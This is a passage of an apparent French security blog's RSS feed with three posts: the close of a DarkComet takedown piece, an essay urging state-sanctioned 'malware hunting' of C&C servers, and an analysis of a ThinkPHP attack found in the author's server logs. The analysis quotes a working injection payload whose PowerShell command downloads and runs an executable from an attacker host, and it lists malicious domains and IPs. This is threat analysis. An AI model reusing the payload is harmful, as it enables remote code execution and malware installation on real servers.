+<p>Seulement voilà, comme dit plus haut en guise d&rsquo;avertissement déguisé, on pourrait, seulement à l&rsquo;aide de ces deux vulnérabilités, nettoyer 50% du parc cybermalveillant français, d&rsquo;un coup, sans forcer, si bien sûr le cadre de l&rsquo;article précédent existait (mise en place de véritables fondements au hacking éthique, etc..) </p>
+<p>J&rsquo;espère que cette article vous a plu, n&rsquo;hésitez pas à laisser un commentaire, une remarque, ou même un message (je les lis tous et je répond généralement rapidement). </p>
+<p>En ce qui me concerne, j&rsquo;ai été ravis d&rsquo;écrire cet article, je n&rsquo;ai cependant pas encore choisi ma prochaine victime alors n&rsquo;hésitez pas à m&rsquo;envoyer des idées 🙂</p>
+<h3>Sources</h3>
+<p>https://pseudolaboratories.github.io/DarkComet-upload-vulnerability/<br />
+https://www.shodan.io/<br />
+https://techanarchy.net/blog/darkcomet-hacking-the-hacker<br />
+https://fr.wikipedia.org/wiki/DarkComet</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/malware-hunting-2-la-fin-de-darkcomet/">Malware Hunting 2/? : La fin de DarkComet</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Malware Hunting 1/? : Introduction</title>
+		<link>https://hackonch.ml/fr/fun/malware-hunting-1-introduction/</link>
+				<pubDate>Sun, 05 May 2019 19:14:33 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Malware-Hunting]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=886</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Lorsque l&#8217;on parle d&#8217;invasions extraterrestres, un des premiers films qui me vient en tête c&#8217;est Independance Day. Dans ce film, les humains sont confrontés à une&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/fun/malware-hunting-1-introduction/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/malware-hunting-1-introduction/">Malware Hunting 1/? : Introduction</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde,</p>
+<p>Lorsque l&rsquo;on parle d&rsquo;invasions extraterrestres, un des premiers films qui me vient en tête c&rsquo;est Independance Day. Dans ce film, les humains sont confrontés à une invasion massive de vilains aliens.</p>
+<p>Même s&rsquo;ils ont essayé de lutter, ils ne faisaient clairement pas le poids contre une civilisation alien nettement plus avancée technologiquement. C&rsquo;est alors qu&rsquo;à un moment, étant fatigués d&rsquo;essayer de détruire un à un les vilains vaisseaux aliens, un informaticien dans le film a carrément l&rsquo;idée de détruire le vaisseau mère à l&rsquo;aide d&rsquo;un virus informatique ainsi que d&rsquo;une ogive nucléaire (le virus visant à créer une attaque informatique de grande ampleur sur les vaisseaux sur Terre et l&rsquo;ogive, à mettre H.S le vaisseau mère).<br />
+</p>
+<figure>
+    <img src='https://media.giphy.com/media/3o6gE2qaKdNm3diaFa/giphy.gif' alt='missing' /><figcaption style="font-size:0.85em">On constate effectivement de légères lacunes technologiques pour les humains</figcaption></figure>
+<p></p>
+<p>C&rsquo;est à ce moment-là que je vois venir les hordes de semi-questions du type: « Je ne vois pas le rapport avec le titre de l&rsquo;article ? »</p>
+<p>Comme j&rsquo;aime troller, je vais vous répondre par une question simple (oui oui, répondre par une question 🙂 ) :</p>
+<p><strong><em>Que se passerait-il si au lieu de recenser et de traiter les ordinateurs infectés par des <del datetime="2019-05-05T18:00:04+00:00">vaisseaux aliens</del> logiciels malveillants, on recensait et on traitait <del datetime="2019-05-05T18:00:04+00:00">les vaisseaux mères</del> les serveurs de Contrôle et de Commande (C&amp;C) ?</em></strong></p>
+<p>Cette idée ne vient pas de moi, en réalité, elle existe depuis plusieurs années et porte le doux nom de « Malware Hunting ».</p>
+<p>Pour expliquer le principe, il n&rsquo;y a pas plus simple:</p>
+<p>1°) Repérer un logiciel malveillant<br />
+2°) « L&rsquo;interroger » afin de connaître son serveur C&amp;C (Contrôle et Commande)<br />
+3°) Remonter l&rsquo;information aux autorités compétentes</p>
+<p>Partant de cette définition, mon article sur la dissection d&rsquo;une attaque de masse chinoise (<a href="https://blog.tchernobyl.ml/fun/dissection-dune-attaque-de-masse-chinoise/">ici</a>) s&rsquo;apparente à du Malware Hunting.</p>
+<p>Pour moi, cette idée est le but final du fameux Hacking Ethique. En effet, aujourd&rsquo;hui l&rsquo;Ethical Hacking comme aiment bien l&rsquo;appeler nos amis anglo-saxons, ne se limite pricipalement qu&rsquo;au remontées de failles.</p>
+<p>Or je trouve assez triste de me dire que la seule chose d&rsquo;éthique dans le hacking c&rsquo;est de remonter des failles. Sérieusement, on en fait quoi du fait de délivrer des miliers d&rsquo;ordinateurs de quelqu&rsquo;un qui se croit tout permis ? On en fait quoi de nos serveurs qui cèdent à la barbarie du minage de cryptomonnaie ou encore de ces jeunes collégiens qui, guidés par des tutos, se mettent à télécharger des logiciels infectés en pensant qu&rsquo;ils vont devenirs de gros caïds 2.0 pleins aux as (cf. <a href="https://blog.tchernobyl.ml/systeme/les-r-a-t-ou-les-pires-arnaques-du-web/">ici</a>)</p>
+<p></p>
+<figure>
+    <img src='https://media.giphy.com/media/8xgqLTTgWqHWU/giphy.gif' alt='missing' /><br />
+</figure>
+<p></p>
+<p>Honnêtement, j&rsquo;adorerais tellement voir un jour, un état mettre en place de VRAIS fondements au hacking éthique.<br />
+Je pense que ça pourrait avoir de grosses répercussions sociétales. En effet, ça pourrait changer l&rsquo;image de voleur 2.0 inhérente au hacker et on pourrait même voir apparaître un phénomène de mode non plus de vidéos ou d&rsquo;articles sur comment attaquer de pauvres ordinateurs mais plutôt sur comment identifier un botnet et le remonter aux autorités.</p>
+<p>Ces mêmes autorités pourraient avoir la mission de s&rsquo;assurer qu&rsquo;il ne s&rsquo;agisse pas d&rsquo;un pauvre site infecté qui fait office de relais aux vrai C&amp;C et ainsi donner le feu vert de l&rsquo;attaquer via un système de listes noires publiques d&rsquo;adresses IP comme il en existe déjà sur de nombreux sites spécialisés. Sans compter bien sûr tout le bénéfice que cela pourrait avoir en matière d&#8217;emplois.</p>
+<p>Même si je sais que je pars peut-être un peu loin, je suis sûr que c&rsquo;est faisable et que ça peut être une très bonne solution à un problème d&rsquo;insécurité informatique majeure que l&rsquo;on a aujourd&rsquo;hui en France et dans de nombreux pays.</p>
+<p>En attendant le deuxième épisode qui devrait être un peu plus amusant et un peu moins théorique, j&rsquo;espère que le début de cette mini-série vous a captivé pour la suite. Je voulais aussi tous vous remercier d&rsquo;être toujours plus nombreux à visiter le site et à m&rsquo;envoyer tout pleins de messages super encourageants 🙂 .</p>
+<p>À très bientôt les margoulins !</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/malware-hunting-1-introduction/">Malware Hunting 1/? : Introduction</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Dissection d&#8217;une attaque de masse chinoise</title>
+		<link>https://hackonch.ml/fr/fun/dissection-dune-attaque-de-masse-chinoise/</link>
+				<pubDate>Sat, 20 Apr 2019 18:05:28 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Fun]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Web]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=796</guid>
+				<description><![CDATA[<div class="post-excerpt">Bonjour tout le monde ! Comme vous le savez peut-être, je ne plaisante pas avec la sécurité. Ce qui induit par conséquent que je ne plaisante pas avec celle du&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/fun/dissection-dune-attaque-de-masse-chinoise/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/dissection-dune-attaque-de-masse-chinoise/">Dissection d&rsquo;une attaque de masse chinoise</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Bonjour tout le monde ! </p>
+<p>Comme vous le savez peut-être, je ne plaisante pas avec la sécurité. Ce qui induit par conséquent que je ne plaisante pas avec celle du blog. Ce faisant, une bonne façon de veiller à la sécurité de ses équipements est d&rsquo;éplucher périodiquement les logs des services actifs. Ici je vais me pencher uniquement sur les logs HTTP. </p>
+<h3>1°) Le Contexte </h3>
+<p>Il y a quelques jours donc, je regardais attentivement le fichier de logs et je constatais à ma grande surprise que plus de 50% des requêtes avaient la forme d&rsquo;attaques de masses, faites, donc par des hôtes en scannant internet pour déceler des serveurs vulnérables à certains types d&rsquo;attaques. </p>
+<p>J&rsquo;avais déjà l&rsquo;habitude de ce genre d&rsquo;attaques de masses, très peu sophistiquées et dont les bonnes pratiques permettent largement de s&rsquo;en tirer indemne. </p>
+<p>Cependant je n&rsquo;ai pas pu m&#8217;empêcher de constater une requête, ponctuelle, très ciblée, et pour le moins sophistiquée:</p>
+<pre> 124.161.103.251 - - [02/Apr/2019:17:17:41 +0200] "GET /public/index.php?s=index/thinkx5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/fbouucstzfhszdw10280.exe');start%20C:/Windows/temp/fbouucstzfhszdw10280.exe HTTP/1.1" 301 5 "http://blog.tchernobyl.ml/public/index.php?s=index/thinkx5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/fbouucstzfhszdw10280.exe');start C:/Windows/temp/fbouucstzfhszdw10280.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
+</pre>
+<p>Pour faire simple, une commande powershell qui vise à télécharger un fichier exécutable et à l&rsquo;exécuter est injectée dans le fichier « index.php », ce qui a pour but de causer l’exécution de cette commande par le système.</p>
+<p>Après vérification, il s&rsquo;agirait d&rsquo;une démonstration d&rsquo;attaque contre « ThinkPHP », un framework de développement d&rsquo;applications Web basé sur PHP et distribué sous la licence open source Apache2. Il serait très populaire en Chine, où plus de 40 000 serveurs exécutent ThinkPHP (<a href="https://securitynews.sonicwall.com/xmlpost/thinkphp-remote-code-execution-rce-bug-is-actively-being-exploited/" rel="noopener noreferrer" target="_blank">source</a>)</p>
+<p>Très curieux, et passionné par ce genre de mystères d&rsquo;internet, je télécharge le fichier exécutable et je me mets donc à table (façon de parler) 🙂 .</p>
+<h3>2°) Le Dropper </h3>
+<p>Premièrement, le fichier n&rsquo;est pas lourd du tout (seulement 90 ko) ce qui nous mène à supposer qu&rsquo;il ne s&rsquo;agisse là que d&rsquo;un dropper qui ne téléchargera la charge utile qu&rsquo;après execution. Ce genre de procédé est largement répandu pour faciliter et contrôler l&rsquo;execution du « vrai » virus. </p>
+<p>Ce que je peux dire à ce stade, c&rsquo;est que la ou les personnes qui ont écrit cette pièce de code ne sont pas du tout débutantes. En effet, même si je sais que le programme a été écrit en C++ en regardant quelles bibliothèques sont chargées, je ne peux rien dire d&rsquo;autre sur le contexte d&rsquo;écriture. Il n&rsquo;y a par exemple aucun artéfact de déboguage, aucun commentaire, rien du tout à part le programme en question. Ce qui est assez rare pour le souligner.</p>
+<p>Ce fichier passe donc le 6ème point du fameux Development Tradecraft de la CIA qui est: </p>
+<blockquote><p> Raise the difficulty for analysis and reverse-engineering, and removes artifacts used for attribution/origination.</p></blockquote>
+<h3>3°) La charge utile </h3>
+<p>Pendant l&rsquo;execution, deux autres fichiers sont successivements téléchargés et exécutés: nmbsawer.exe et wercplshost.exe.<br />
+L&rsquo;un fourni un accès à distance (cmd.exe) persistant tout en désactivant la protection Windows Defender et l&rsquo;autre fourni un mineur cryptoactif. J&rsquo;ai d&rsquo;ailleurs pu identifier le pool de minage grâce à un fichier de configuration: pxi.hognoob.se:35791. Le mineur est configuré pour utiliser 1% de la charge CPU.</p>
+<p>Ça a l&rsquo;air de rien comme ça, mais sur des serveurs avec des processeurs Xéon 64 coeurs 1% ce n&rsquo;est pas rien !</p>
+<p>En tout, il y a 6 sous domaines impliqués dans cette opération: </p>
+<pre>
+upa1.hognoob.se 195.128.127.254 ----&gt; composants additionnels téléchargés par le dropper (SERVEUR A)
+upa2.hognoob.se 195.128.127.254 ----&gt; composants additionnels téléchargés par le dropper (SERVEUR A)
+q1a.hognoob.se  195.128.127.254 ----&gt; composants additionnels téléchargés par le dropper (SERVEUR A)
+uio.hognoob.se  195.128.126.120 ----&gt; ??? (SERVEUR C)
+fid.hognoob.se   195.128.127.254 ----&gt; téléchargement initial du dropper (SERVEUR A)
+pxi.hognoob.se  195.128.124.140 ----&gt; pool de minage (SERVEUR B)
+</pre>
+<p>Note interessante, certains sous-domaines sont protégés derrière Cloudflare. Enfin « protégé » car cette « protection » m&rsquo;a permis d&rsquo;avoir les adressse IP des sous-domaines sans aucun soucis. </p>
+<p>Lorsqu&rsquo;on a toutes les adresses IP (qui sont au nombre de trois) de tout les sous-domaines impliqués, on se rend compte très vite que toutes les adresses contactées sont identifiées en Russie. Tous à l&rsquo;exception d&rsquo;une seule: </p>
+<pre>
+http://2019.ip138.com/ic.asp 117.25.157.119 ----&gt; Contrôle et Commande (SERVEUR D)
+</pre>
+<p>Cette adresse web est codée en dur dans un composant additionnel de surveillance téléchargé par le dropper. Ce qui laisse supposer qu&rsquo;il s&rsquo;agisse là de l&rsquo;adresse du serveur de Contrôle et de Commande qui lui serait basé en Chine. De plus, l&rsquo;extension « asp » conforte l&rsquo;hypothèse d&rsquo;un contrôle Web sur le botnet.</p>
+<p>On remarquera par ailleurs le nom du sous-domaine en « 2019 ». En faisant quelques recherches j&rsquo;ai constaté que chaque opération avait son sous-domaine en fonction de l&rsquo;année. Le plus vieux que j&rsquo;ai pu trouver remontant à 2017.</p>
+<h3>Verdict </h3>
+<p>Même si rien ne nous permet de dire qu&rsquo;il s&rsquo;agisse bien là d&rsquo;une attaque orchestrée par des pirates russes, il est évident que la plupart des infrastructures supportant l&rsquo;opération se trouvent, elles, en Russie. </p>
+<p>Le point intriguant dans tout ceci c&rsquo;est que le plus gros bénéfice de l&rsquo;opération se trouve en Chine et comme par hasard un serveur vital de l&rsquo;opération se trouve être lui aussi en Chine. </p>
+<p>Ce point est d&rsquo;autant plus intriguant lorsque l&rsquo;on sait que le domaine serait attribué à <a href="https://attack.mitre.org/groups/G0073/">APT 19</a>. Aussi connue sous le doux nom de « Codoso Team » ou encore « Sunshop Group ». Il s&rsquo;agirait d&rsquo;un groupe de hackers indépendants qui bénéficieraient d&rsquo;une certaine forme d&rsquo;appui de la part du gouvernement chinois (<a href="https://www.fireeye.fr/current-threats/apt-groups.html#apt19">source</a>) </p>
+<p>En bref, voilà où m&rsquo;a mené ma petite enquête pour en apprendre un peu plus sur ces pirates de l&rsquo;ombre qui font tant parler d&rsquo;eux, et sur qui, paradoxalement, on connait peu de choses. </p>
+<p>J&rsquo;espère que cet article vous a plu, n&rsquo;hésitez pas à m&rsquo;envoyer des messages via le formulaire de contact ou même en commentaire pour me donner votre point de vue, ou si vous avez connu la même situation / une situation similaire, je les lirais tous ! 🙂</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/fun/dissection-dune-attaque-de-masse-chinoise/">Dissection d&rsquo;une attaque de masse chinoise</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+	</channel>
+</rss>
